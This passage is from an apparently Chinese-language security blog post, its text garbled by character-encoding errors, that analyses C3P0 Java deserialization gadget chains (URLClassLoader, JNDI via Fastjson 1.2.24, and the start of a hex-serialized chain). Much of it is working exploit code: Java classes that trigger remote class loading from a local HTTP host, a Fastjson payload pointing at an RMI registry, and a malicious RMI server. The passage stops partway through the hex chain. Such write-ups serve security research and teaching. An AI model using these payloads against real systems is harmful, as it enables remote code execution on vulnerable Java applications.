class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€ååºåˆ—åŒ–Gadgets"><a href="#äºŒã€ååºåˆ—åŒ–Gadgets" class="headerlink" title="äºŒã€ååºåˆ—åŒ–Gadgets"></a>äºŒã€ååºåˆ—åŒ–Gadgets</h2><p>C3P0æœ‰ä¸‰æ¡Gadget</p><p>â€¢ URLClassLoader è¿œç¨‹ç±»åŠ è½½</p><p>â€¢ JNDI æ³¨å…¥</p><p>â€¢ åˆ©ç”¨ HEX åºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><h2 id="ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ "><a href="#ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ " class="headerlink" title="ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ "></a>ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ </h2><h3 id="URLClassLoaderé“¾"><a href="#URLClassLoaderé“¾" class="headerlink" title="URLClassLoaderé“¾"></a>URLClassLoaderé“¾</h3><h4 id="gadgetæµç¨‹åˆ†æ"><a href="#gadgetæµç¨‹åˆ†æ" class="headerlink" title="gadgetæµç¨‹åˆ†æ"></a>gadgetæµç¨‹åˆ†æ</h4><p>æ—¢ç„¶æ˜¯åˆ©ç”¨ä¸ClassLoaderç›¸å…³çš„é“¾å­ï¼Œé‚£ä¹ˆæœ€åå¤§æ¦‚ç‡æ˜¯åŠ¨æ€åŠ è½½æ¶æ„å­—èŠ‚ç å¯¼è‡´rce</p><p>è¯¥åˆ©ç”¨é“¾æœ€ç»ˆèƒ½è¿›è¡Œä»»æ„è¿œç¨‹ç±»åŠ è½½</p><p>é“¾å°¾:<code>ReferenceableUtils.referenceToObject()</code></p><p>å…¶ä¸­è°ƒç”¨äº† URLClassLoader åŠ è½½ç±»çš„æ–¹æ³•ï¼ŒåŒæ—¶è¿˜è¿›è¡Œäº†ç±»çš„åŠ è½½</p><p><a href="https://imgse.com/i/pCM8nQx"><img src="https://s1.ax1x.com/2023/06/16/pCM8nQx.png" alt="pCM8nQx.png"></a></p><p>å¾€ä¸Šæ‰¾ï¼Œåœ¨<code>ReferenceIndirector.java</code>ä¸­<code>ReferenceSerialized.getObject()</code> è°ƒç”¨äº†<code>ReferenceableUtils.referenceToObject()</code></p><p><a href="https://imgse.com/i/pCM81Te"><img src="https://s1.ax1x.com/2023/06/16/pCM81Te.png" alt="pCM81Te.png"></a></p><p>ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œ<code>PoolBackedDataSourceBase.readObject() </code>è°ƒç”¨äº† <code>ReferenceSerialized.getObject()</code>,åŒæ—¶æ­£å¥½<code>PoolBackedDataSourceBase.readObject()</code>å¯ä»¥ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£</p><p><a href="https://imgse.com/i/pCM8GYd"><img src="https://s1.ax1x.com/2023/06/16/pCM8GYd.png" alt="pCM8GYd.png"></a></p><p>å…¶ä¸­<code>IndirectlySerialized</code>æ˜¯ä¸ªæ¥å£ç±»ï¼ŒåŒæ—¶<code>ReferenceIndirector</code>ç»§æ‰¿äº†è¿™ä¸ªæ¥å£</p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject()</span><br><span class="line">ReferenceSerialized.getObject()</span><br><span class="line">ReferenceableUtils.referenceToObject()</span><br><span class="line">ObjectFactory.getObjectInstance()</span><br><span class="line">URLClassLoader åŠ¨æ€åŠ è½½æ¶æ„å­—èŠ‚ç </span><br></pre></td></tr></table></figure><h4 id="Expç¼–å†™"><a href="#Expç¼–å†™" class="headerlink" title="Expç¼–å†™"></a>Expç¼–å†™</h4><p>å…ˆå†™ä¸ª<code>ReferenceableUtils.referenceToObject()</code>çš„<code>URLClassLoader</code>åŠ è½½æ¶æ„ç±»çš„expå…œåº•</p><p><strong>Exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.mchange.v2.naming.ReferenceableUtils&quot;</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;referenceToObject&quot;</span>, Reference.class, Name.class, Context.class, Hashtable.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> method.invoke(clazz, reference, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> method.invoke(o, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCM8JfA"><img src="https://s1.ax1x.com/2023/06/16/pCM8JfA.png" alt="pCM8JfA.png"></a></p><p><a href="https://imgse.com/i/pCM8tSI"><img src="https://s1.ax1x.com/2023/06/16/pCM8tSI.png" alt="pCM8tSI.png"></a></p><p>åœ¨<code>PoolBackedDataSourceBase.readObject</code>ä¸­ï¼Œæƒ³è¦è¿›å…¥é“¾å­ä¸‹ä¸€æ­¥getObject()ï¼Œå¿…é¡»è¦æ»¡è¶³ä¼ å…¥çš„ç±»å¿…é¡»æ˜¯ <code>IndirectlySerialized</code>è¿™ä¸ªç±»ï¼Œæ»¡è¶³æ¡ä»¶åï¼Œè°ƒç”¨<code>getObject()</code>æ–¹æ³•ï¼Œç„¶åå°†è¿”å›çš„ç±»è½¬ä¸º<code>ConnectionPoolDataSource</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"><span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å˜æˆäº†<code>ConnectionPoolDataSource</code>å»æ‰§è¡Œ<code>getObject()</code>æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><a href="https://imgse.com/i/pCM8HpR"><img src="https://s1.ax1x.com/2023/06/16/pCM8HpR.png" alt="pCM8HpR.png"></a></p><p>å¯ä»¥å‘ç°ConnectionPoolDataSourceæ˜¯ä¸€ä¸ªæ¥å£ï¼ŒåŒæ—¶å¹¶æ²¡æœ‰ç»§æ‰¿serializeæ¥å£ï¼Œæ˜¯ä¸èƒ½ç›´æ¥è¢«åºåˆ—åŒ–çš„</p><p>çªç ´ç‚¹æ˜¯åœ¨<code>PoolBackedDataSourceBase.writeObject()</code>ï¼Œå†™ä¸‹äº†åŒ…è£…<code>ConnectionPoolDataSource</code>ç±»çš„å…·ä½“æµç¨‹</p><p><a href="https://imgse.com/i/pCM8b11"><img src="https://s1.ax1x.com/2023/06/16/pCM8b11.png" alt="pCM8b11.png"></a></p><p>å…ˆå°è¯•å¯¹<code>ConnectionPoolDataSource</code>ç±»è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œåºåˆ—åŒ–å¤±è´¥å°±ç”¨<code>indirector.indirectForm()</code>å¯¹å…¶è¿›è¡ŒåŒ…è£…</p><p>è·Ÿè¿›<code>indirector.indirectForm()</code>ï¼Œè€Œè¿™é‡Œçš„<code>indirector</code>å°±æ˜¯<code>ReferenceIndirector</code></p><p><a href="https://imgse.com/i/pCM8q6x"><img src="https://s1.ax1x.com/2023/06/16/pCM8q6x.png" alt="pCM8q6x.png"></a></p><p>æœ€åè¿”å›äº†<code>ReferenceSerialized</code>ç±»</p><p><a href="https://imgse.com/i/pCM8LX6"><img src="https://s1.ax1x.com/2023/06/16/pCM8LX6.png" alt="pCM8LX6.png"></a></p><p><code>ReferenceSerialized</code>ç±»ç»§æ‰¿äº†ä¸€ä¸ªæ¥å£ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><p><a href="https://imgse.com/i/pCM8j0O"><img src="https://s1.ax1x.com/2023/06/16/pCM8j0O.png" alt="pCM8j0O.png"></a></p><p>ç»§æ‰¿äº†<strong>serialize</strong>æ¥å£ï¼Œè‡³æ­¤ï¼ŒåŒ…è£…çš„è¿‡ç¨‹åˆ†æç»“æŸ</p><p>æ‰€ä»¥<code>ConnectionPoolDataSource</code>ç±»ç»è¿‡åºåˆ—åŒ–åï¼Œè¿”å›çš„çš„æœ€ç»ˆæ˜¯<code>ReferenceSerialized</code>ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´<code>ConnectionPoolDataSource</code>å¤–è¡¨ä¸Šè¿˜æ˜¯<code>ConnectionPoolDataSource</code>ï¼Œä½†æ˜¯å®é™…ä¸Šå·²ç»å˜æˆäº†<code>ReferenceSerialized</code>æ‰€ä»¥åœ¨<code>PoolBackedDataSourceBase.readObject</code>ä¸­è°ƒç”¨çš„å…¶å®æ˜¯<code>ReferenceSerialized.getObject()</code>æ–¹æ³•</p><p>å…ˆæ„é€ ä¸€ä¸ªåŒ…å«è¿œç¨‹æ¶æ„ç±»çš„<code>ConnectionPoolDataSource</code>ç±»ï¼Œæœ‰è¶£çš„æ˜¯ï¼šåœ¨<code>Referenceable</code>æ¥å£ä¸­æœ‰ä¸€ä¸ª<code>getReference()</code>æ–¹æ³•å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ª<code>Reference</code>å¯¹è±¡</p><p>é€šè¿‡åå°„ä¿®æ”¹<code>connectionPoolDataSource</code>å±æ€§å€¼ä¸ºæ¶æ„ç±»</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Badclass</span> <span class="variable">badclass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Badclass</span>();</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase, badclass);</span><br><span class="line"></span><br><span class="line">        serialize(poolBackedDataSourceBase);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Badclass</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCM8zAe"><img src="https://s1.ax1x.com/2023/06/16/pCM8zAe.png" alt="pCM8zAe.png"></a></p><h3 id="JNDIé“¾"><a href="#JNDIé“¾" class="headerlink" title="JNDIé“¾"></a>JNDIé“¾</h3><h4 id="gadgetæµç¨‹åˆ†æ-1"><a href="#gadgetæµç¨‹åˆ†æ-1" class="headerlink" title="gadgetæµç¨‹åˆ†æ"></a>gadgetæµç¨‹åˆ†æ</h4><p>é“¾å°¾:<code>JndiRefForwardingDataSource.dereference()</code>ä¸­å­˜åœ¨<code>lookup()</code></p><p><a href="https://imgse.com/i/pCMGStH"><img src="https://s1.ax1x.com/2023/06/16/pCMGStH.png" alt="pCMGStH.png"></a></p><p><code>lookup()</code>çš„å‚æ•°ä¸º<code>jndiName</code>ï¼Œè·Ÿè¿›çœ‹çœ‹è¿™ä¸ª<code>jndiName</code>æ˜¯å¦å¯æ§ï¼Œ<code>Object jndiName = this.getJndiName();</code></p><p><a href="https://imgse.com/i/pCMGP1I"><img src="https://s1.ax1x.com/2023/06/16/pCMGP1I.png" alt="pCMGP1I.png"></a></p><p><code>getJndiName()</code>å¯¹jndiNameè¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœjndiNameä¸ºNameç±»å‹ï¼Œåˆ™è°ƒç”¨<code>jndiName.clone()</code>ï¼Œå¦åˆ™è¿”å›Stringç±»å‹çš„jndiName</p><p>è€Œåœ¨dereference()å‡½æ•°ä¸­æ˜¯å…è®¸ä¼ å…¥Stringç±»å‹çš„å‚æ•°çš„</p><p><a href="https://imgse.com/i/pCMGFjP"><img src="https://s1.ax1x.com/2023/06/16/pCMGFjP.png" alt="pCMGFjP.png"></a></p><p>è‡³æ­¤ï¼Œå°¾é“¾æ„é€ å®Œæ¯•</p><p>å‘ä¸Šæ‰¾ï¼ŒåŒä¸€ä¸ªç±»ä¸‹çš„<code>innner()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>dereference()</code></p><p><a href="https://imgse.com/i/pCMGAnf"><img src="https://s1.ax1x.com/2023/06/16/pCMGAnf.png" alt="pCMGAnf.png"></a></p><p>ç»§ç»­æ‰¾ï¼Œ<code>JndiRefConnectionPoolDataSource</code>ä¸­æœ‰<code>setJndiName()</code>å¯ä»¥è®¾ç½®<code>jndiName</code>çš„å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211181339667.png" alt="image-20221118133948643"></p><p>è‡³æ­¤ï¼Œåˆ©ç”¨é“¾ç»“æŸ</p><p>(å½“ç„¶ï¼Œå…¶å®åœ¨JndiRefForwardingDataSourceå·²ç»æœ‰éå¸¸å¤šçš„ getter&#x2F;setter æ–¹æ³•ï¼Œæ»¡è¶³ fastjson è°ƒç”¨é“¾çš„æ¡ä»¶äº†ï¼Œå·²ç»å¯ä»¥ç¼–å†™Expäº†ã€‚ä¸ºä»€ä¹ˆè¿˜è¦å¾€ä¸Šæ‰¾ï¼Ÿå› ä¸ºJndiRefForwardingDataSource ç±»æ˜¯ default çš„ç±»ï¼Œåˆ©ç”¨æ¡ä»¶è¿˜æ˜¯æœ‰é™)</p><h4 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h4><p>æ­¤æ¡é“¾å­æ˜¯åŸºäºFastjsonæˆ–Jacksonååºåˆ—åŒ–ç¯å¢ƒä¸‹æ¥æ„é€ çš„</p><p>å…ˆå¯¼å…¥fastjsonä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;LoginTimeout\&quot;:1&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>BadRmi</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadRmi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/shell&quot;</span>,refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191606046.png" alt="image-20221119160649943"></p><h3 id="Hexbaseé“¾"><a href="#Hexbaseé“¾" class="headerlink" title="Hexbaseé“¾"></a><strong>Hexbase</strong>é“¾</h3><p>è¯¥é“¾èƒ½æˆç«‹çš„åŸå› æ˜¯åœ¨<code>WrapperConnectionPoolDataSource</code>ç±»çš„æ„é€ å‡½æ•°ä¸­ï¼Œèƒ½å¤Ÿååºåˆ—åŒ–ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><h4 id="gadgetæµç¨‹åˆ†æ-2"><a href="#gadgetæµç¨‹åˆ†æ-2" class="headerlink" title="gadgetæµç¨‹åˆ†æ"></a>gadgetæµç¨‹åˆ†æ</h4><p>é“¾å°¾<code>WrapperConnectionPoolDataSource.WrapperConnectionPoolDataSource(boolean autoregister)</code></p><p>åœ¨å¯¹å±æ€§<code>userOverrides</code>èµ‹å€¼æ—¶,è°ƒç”¨äº†<code>C3P0ImplUtils.parseUserOverridesAsString()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191637209.png" alt="image-20221119163747176"></p><p>è·Ÿè¿›ï¼Œè¯¥æ–¹æ³•ä½œç”¨å°±æ˜¯å°†String 